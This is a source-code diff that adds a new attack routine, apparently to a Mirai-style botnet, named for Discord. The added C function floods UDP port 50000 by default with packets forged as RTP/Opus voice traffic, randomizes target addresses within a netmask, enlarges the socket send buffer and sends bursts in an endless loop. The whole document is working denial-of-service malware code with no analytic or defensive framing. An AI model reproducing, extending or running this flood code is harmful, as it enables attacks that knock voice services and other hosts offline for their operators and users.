@@ -1099,3 +1099,51 @@ void attack_method_udpx(uint8_t targs_len, struct attack_target *targs, uint8_t 
         }
     }
 }
+
+void attack_method_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, fd, burst;
+    uint16_t sport, dport, data_len;
+    struct sockaddr_in dst;
+    char *data;
+
+    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 50000);
+    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 200);
+    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
+    if (burst < 4) burst = 4;
+    if (burst > 128) burst = 128;
+
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) return;
+    i = SNDBUF_MAX;
+    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));
+
+    if (data_len < 12) data_len = 12;
+    data = malloc(data_len);
+    if (!data) { close(fd); return; }
+
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(dport);
+
+    while (TRUE) {
+        for (i = 0; i < targs_len; i++) {
+            uint32_t target = targs[i].netmask < 32 ?
+                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
+            dst.sin_addr.s_addr = target;
+
+            // RTP voice header (12 bytes)
+            data[0] = 0x80;  // V=2, P=0, X=0, CC=0
+            data[1] = 0x60;  // M=0, PT=96 (Dynamic/OPUS)
+            *(uint16_t *)(data + 2) = htons(rand_next() & 0xffff);  // seq
+            *(uint32_t *)(data + 4) = rand_next();                   // timestamp
+            *(uint32_t *)(data + 8) = rand_next();                   // SSRC
+            rand_str(data + 12, data_len - 12);
+
+            for (int b = 0; b < burst; b++) {
+                *(uint16_t *)(data + 2) = htons((rand_next() & 0xffff));  // increment seq
+                sendto(fd, data, data_len, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
+            }
+        }
+    }
+}
